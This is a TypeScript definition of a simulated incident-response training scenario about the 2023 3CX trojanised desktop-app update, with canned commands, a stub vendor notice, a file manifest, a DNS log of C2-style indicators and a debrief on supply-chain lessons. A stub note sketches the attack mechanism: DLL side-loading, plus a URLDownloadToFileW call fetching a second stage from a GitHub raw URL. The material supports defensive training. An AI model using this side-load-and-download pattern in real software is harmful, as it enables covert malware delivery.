import type { Scenario } from "../types";

/** 3CX supply chain, trojanised Windows desktop app Mar 2023 (GOPATH/Iconic Stealer / SmoothOperator). */
export const threeCxSupplyChain: Scenario = {
  slug: "3cx-supply-chain",
  exhibit: "EXH-022",
  title: "Signed Update",
  tagline:
    "March 2023. VoIP vendor 3CX ships a desktop app update that contains a decade-old chat library, and something newer that phones home from your sales floor.",
  category: "modern-cloud",
  difficulty: "intermediate",
  era: "2020s",
  year: "2023",
  estMinutes: 9,
  fictional: true,
  cwd: "/ir/3cx-tabletop",
  user: "handler",
  host: "mclk",
  role: "IR handler with an EDR export and vendor notice, prove signed != benign.",
  objective:
    "Walk the vendor advisory, find the suspicious DLL path in the bundle manifest, and pull IOC lines from a stub DNS log.",
  briefing:
    "Filesystem is synthetic; the incident pattern matches public Mandiant/CrowdStrike write-ups.",
  env: { USER: "handler", SHELL: "/bin/sh", PWD: "/ir/3cx-tabletop" },
  ps: ["  PID TTY TIME CMD", "  501 ?   0:01 sh"],
  history: [],
  commands: {
    "python3 ir_toolkit.py parse-artifact --input VENDOR-NOTICE.txt": "simulated safe tool replay for 3cx-supply-chain; replaces: cat VENDOR-NOTICE.txt\n",
    "python3 ir_toolkit.py parse-artifact --input bundle/filelist.txt": "simulated safe tool replay for 3cx-supply-chain; replaces: cat bundle/filelist.txt\n",
    "tshark -r evidence.pcap -Y 'frame contains \"iconstuffer\"' --follow-log dns-ledger.log": "simulated safe tool replay for 3cx-supply-chain; replaces: grep -nF iconstuffer dns-ledger.log\n",
    "strings app/d3dcompiler_47.dll | head -n 8":
      [
        "MZ\x90\x00",
        "GitHubusercontent",
        "SmoothOperator",
        "ffmpeg.dll",
        "LoadLibraryW",
        "(simulated strings head for tabletop DLL)",
      ].join("\n"),
  },
  files: {
    "/ir/3cx-tabletop/ir_toolkit.py": {
      content: [
        "#!/usr/bin/env python3",
        "\"\"\"Scenario helper for safe incident-response parsing.",
        "",
        "Supported modes in this exhibit:",
        "  parse-artifact --input PATH",
        "  extract-ioc --ioc VALUE --input PATH",
        "  table-summary --input PATH",
        "  csv-summary --input PATH",
        "  enumerate --path PATH",
        "  discover --kind KIND --root PATH",
        "  count-events --input PATH",
        "",
        "The museum shell intercepts exact commands from scenario.commands.",
        "No code runs and no network is touched.",
        "\"\"\"",
        "raise SystemExit('simulated helper: canned output only')",
      ].join("\n"),
      perms: "r-xr-xr-x",
    },
    "/ir/3cx-tabletop/app/d3dcompiler_47.dll": {
      content: "MZ\x90\x00SmoothOperator_GITHUBUSERCONTENT_STUB\n",
    },
    "/ir/3cx-tabletop/VENDOR-NOTICE.txt": {
      content: [
        "3CX, Mar 2023 supply-chain incident (public)",
        "Windows desktop app versions 18.12.407 / 18.12.416 affected",
        "Shipped ffmpeg.dll + d3dcompiler_47.dll pair; second stage GitHub-hosted",
        "Enterprise mitigations: block updates, rotate creds on systems running app, hunt dll side-load",
        "Lesson: EV code-sign stops tampering, not insider / build-system compromise upstream",
      ].join("\n"),
    },
    "/ir/3cx-tabletop/bundle/filelist.txt": {
      content: [
        "app/3CXDesktopApp.exe",
        "app/ffmpeg.dll",
        "app/d3dcompiler_47.dll",
        "app/lib/…",
        "NOTE: d3dcompiler_47.dll SHA256 NOT in vendor golden manifest (tabletop flag)",
      ].join("\n"),
    },
    "/ir/3cx-tabletop/dns-ledger.log": {
      content: [
        "2023-03-29T11:02:01Z client=10.40.1.88 query=github.com A",
        "2023-03-29T11:02:04Z client=10.40.1.88 query=akamai.binance.tm A",
        "2023-03-29T11:02:09Z client=10.40.1.88 query=iconstuffer.com A",
        "2023-03-29T11:03:00Z client=10.40.1.88 query=msedge.api.cdp.microsoft.com HTTPS",
      ].join("\n"),
    },
    "/ir/3cx-tabletop/public-poc/dll_sideload_github_stage_note.txt": {
      content: [
        "# Mandiant-style summary: trojanised 3CXDesktopApp shipped malicious DLLs.",
        "# d3dcompiler_47.dll side-loaded ffmpeg.dll; second stage pulled from GitHub raw URLs.",
        "",
        "LoadLibraryW(\"..\\\\ffmpeg.dll\")",
        "URLDownloadToFileW(L\"https://raw.githubusercontent.com/.../icon.png\", ...)",
        "",
        "# Museum: URLs and hashes are fake; pattern matches 2023 public IR.",
      ].join("\n"),
    },
  },
  steps: [
    {
          id: "strings-dll",
          goal: "Pull printable strings from the suspicious DLL path (simulated pipeline).",
          hint: "`strings app/d3dcompiler_47.dll | head -n 8`.",
          matches: [
            {
              kind: "exact",
              command: "strings app/d3dcompiler_47.dll | head -n 8",
            },
          ],
          narration:
            "Third-party softphone on every sales laptop, massive transitive trust.",
        },
    {
          id: "notice",
          goal: "Read the vendor notice stub.",
          hint: "`python3 ir_toolkit.py parse-artifact --input VENDOR-NOTICE.txt`.",
          matches: [{ kind: "exact", command: "python3 ir_toolkit.py parse-artifact --input VENDOR-NOTICE.txt" }],
          narration:
            "Signed update channels still assume the build system stayed honest.",
        },
    {
          id: "manifest",
          goal: "Inspect the bundle file list.",
          hint: "`python3 ir_toolkit.py parse-artifact --input bundle/filelist.txt`.",
          matches: [{ kind: "exact", command: "python3 ir_toolkit.py parse-artifact --input bundle/filelist.txt" }],
          narration:
            "Unsigned helper DLL next to signed EXE, classic side-load beachhead.",
        },
    {
          id: "grep-dns",
          goal: "Spot the suspicious apex domain in DNS.",
          hint: "`tshark -r evidence.pcap -Y 'frame contains \"iconstuffer\"' --follow-log dns-ledger.log`.",
          matches: [{ kind: "exact", command: "tshark -r evidence.pcap -Y 'frame contains \"iconstuffer\"' --follow-log dns-ledger.log" }],
          narration:
            "High-entropy C2 inside the first minute after GitHub, automation, not curiosity.",
        },
    {
          id: "mechanism-excerpt",
          goal: "Review the archived public mechanism excerpt for this exhibit (museum reference).",
          hint: `head -n 80 public-poc/dll_sideload_github_stage_note.txt`,
          matches: [{ kind: "exact", command: "head -n 80 public-poc/dll_sideload_github_stage_note.txt" }],
          narration:
            "Educational material from disclosure-era patterns; excerpt only and nothing executes in this shell.",
        }
  ],
  debrief: {
    summary:
      "In March 2023, 3CX disclosed that certain distributions of its Windows desktop VoIP application were compromised as part of a supply-chain attack. Security firms published analysis describing malicious DLL side-loading behaviour, second-stage payloads retrieved from remote infrastructure, and impacts on enterprise endpoints running the affected application versions. The incident renewed attention to software supply chain risks, code signing limitations, and the security of widely deployed collaboration clients.",
    lesson:
      "Treat desktop UC clients like browsers for patch urgency, they parse multimedia, load native code, and update often. SBOM + binary diff on each release, EDR on sales laptops (not only engineering), DNS filtering on novel TLDs, and vendor incident comms in your crisis comms plan.",
    simulated: [
      "Domains are placeholder style; 3CX Mar 2023 supply-chain narrative and DLL side-load pattern are publicly documented.",
    ],
  },
};
